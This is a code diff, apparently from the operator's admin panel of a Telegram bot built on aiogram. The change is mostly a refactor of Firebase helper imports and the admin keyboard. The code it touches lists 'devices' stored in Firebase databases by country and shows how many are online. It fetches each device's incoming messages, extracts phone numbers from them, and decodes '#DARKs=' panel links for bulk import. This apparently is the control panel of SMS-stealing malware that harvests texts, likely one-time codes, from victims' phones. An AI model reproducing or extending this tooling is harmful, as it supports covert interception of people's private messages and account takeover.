@@ -3,20 +3,13 @@ from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKe
 from aiogram.fsm.context import FSMContext
 import time
 import database as db
-import firebase_utils as fbu
+import services.firebase_service as fb_service
 from utils.ui import sc, btn
 from utils.helper import is_admin, get_countries, get_servers_grouped
+from keyboards.admin_kb import admin_kb
 from states import S
 
 admin_router = Router()
-
-def admin_kb():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [btn("enter as user", "user:home", "👤"), btn("analytics", "admin:analytics", "📊")],
-        [btn("manage servers", "admin:manage_fb", "🔥"), btn("manage bots", "admin:bots", "🤖")],
-        [btn("manage admins", "admin:admins", "🛡"), btn("broadcast", "admin:broadcast", "📢")],
-        [btn("view users", "admin:users", "👥"), btn("refresh panel", "admin:home", "🔄")]
-    ])
 
 @admin_router.message(F.text == "/admin")
 async def admin_panel_cmd(msg: Message):
@@ -64,7 +57,7 @@ async def admin_server(cq: CallbackQuery):
     
     kb = []
     for i, fb in enumerate(srv):
-        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+        clients = await fb_service.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
         online = sum(1 for c in clients.values() if isinstance(c, dict) and c.get("status")) if clients else 0
         total = len(clients) if clients else 0
         kb.append([btn(f"base {i+1} ({online} ON / {total} Total)", f"admin:base:{country}:{idx}:{i}", "🗂")])
@@ -83,7 +76,7 @@ async def admin_base(cq: CallbackQuery):
     try: await cq.message.edit_text("🔄 Fetching devices...")
     except: pass
     
-    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+    clients = await fb_service.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
     kb = []
     if clients:
         for dev_id, c in clients.items():
@@ -104,9 +97,9 @@ async def admin_device(cq: CallbackQuery):
     try: await cq.message.edit_text("🔄 Fetching numbers...")
     except: pass
     
-    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=1000", fb.get("auth"))
+    msgs_dict = await fb_service.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=1000", fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
-    best_nums = fbu.extract_best_numbers({}, msgs)
+    best_nums = fb_service.extract_best_numbers({}, msgs)
     
     text = f"📱 <b>Device Info</b>\n🆔 {dev_id}\n🔗 {fb['url']}\n\n<b>Numbers:</b>\n"
     if not best_nums: text += "No numbers found."
@@ -162,7 +155,7 @@ async def admin_bulk_done(msg: Message, state: FSMContext):
         url = line.strip()
         if not url: continue
         if "#DARKs=" in url or "?s=" in url:
-            dec = fbu.decode_panel_url(url)
+            dec = fb_service.decode_panel_url(url)
             if dec: url = dec[0]
         if url.startswith("http"):
             d["firebases"].append({"url": url, "label": "Base ?", "country": country, "auth": ""})
